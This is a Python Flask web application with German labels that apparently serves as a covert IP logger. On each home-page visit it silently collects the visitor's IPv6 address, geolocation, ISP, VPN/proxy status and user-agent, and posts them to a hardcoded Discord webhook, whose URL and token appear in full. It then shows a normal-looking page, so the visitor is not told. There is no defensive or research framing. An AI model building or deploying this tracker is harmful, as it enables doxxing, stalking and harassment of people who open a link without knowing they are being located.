from flask import Flask, request, render_template, jsonify
import requests
import os
from datetime import datetime
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"

def get_real_ip_v6():
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip and ':' in cf_ip:
        return cf_ip
    
    xff = request.headers.get('X-Forwarded-For')
    if xff:
        ips = [ip.strip() for ip in xff.split(',')]
        for ip in reversed(ips):
            if ':' in ip and not ip.startswith('::ffff:'):
                return ip
    
    xri = request.headers.get('X-Real-IP')
    if xri and ':' in xri and not xri.startswith('::ffff:'):
        return xri
    
    tci = request.headers.get('True-Client-IP')
    if tci and ':' in tci and not tci.startswith('::ffff:'):
        return tci
    
    remote = request.remote_addr
    if remote and ':' in remote and not remote.startswith('::ffff:'):
        return remote
    
    return get_ip_via_api_v6()

def get_ip_via_api_v6():
    try:
        response = requests.get('https://api6.ipify.org?format=json', timeout=5)
        if response.status_code == 200:
            ip = response.json().get('ip')
            if ip and ':' in ip:
                return ip
    except:
        pass
    try:
        response = requests.get('http://ip-api.com/json/?fields=query', timeout=5)
        if response.status_code == 200:
            ip = response.json().get('query')
            if ip and ':' in ip:
                return ip
    except:
        pass
    return None

def check_if_vpn_v6(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,proxy,hosting', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                ist_vpn = data.get('proxy', False) or data.get('hosting', False)
                return ist_vpn, data
    except:
        pass
    return False, None

@app.route('/')
def home():
    real_ip_v6 = get_real_ip_v6()
    if not real_ip_v6:
        real_ip_v6 = "Keine IPv6 erkannt"
    
    user_agent = request.headers.get('User-Agent', 'Unbekannt')
    referer = request.headers.get("Referer", "Kein Referer")
    
    ist_vpn = False
    geo_data = None
    if real_ip_v6 != "Keine IPv6 erkannt":
        ist_vpn, geo_data = check_if_vpn_v6(real_ip_v6)
    
    embed = {
        "embeds": [{
            "title": "IPv6 erfasst",
            "color": 0xFFAA00 if ist_vpn else 0x00AAFF,
            "fields": [
                {"name": "IPv6", "value": f"`{real_ip_v6}`", "inline": False},
                {"name": "VPN/Proxy", "value": "JA" if ist_vpn else "NEIN", "inline": True},
                {"name": "Standort", "value": f"{geo_data.get('country', 'Unbekannt')} / {geo_data.get('city', '')}" if geo_data else "Unbekannt", "inline": True},
                {"name": "ISP", "value": geo_data.get('isp', 'Unbekannt') if geo_data else "Unbekannt", "inline": True},
                {"name": "User-Agent", "value": f"```{user_agent[:150]}```", "inline": False},
                {"name": "Zeit", "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"), "inline": True}
            ]
        }]
    }
    
    try:
        r = requests.post(WEBHOOK_URL, json=embed, timeout=10)
        print(f"[{datetime.now()}] Webhook Status: {r.status_code} - IPv6: {real_ip_v6}")
    except Exception as e:
        print(f"[{datetime.now()}] Error: {str(e)}")
    
    return render_template("index.html")

@app.route('/api/ip')
def get_ip_json():
    real_ip_v6 = get_real_ip_v6()
    return jsonify({"ip": real_ip_v6, "version": "IPv6"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="::", port=port)
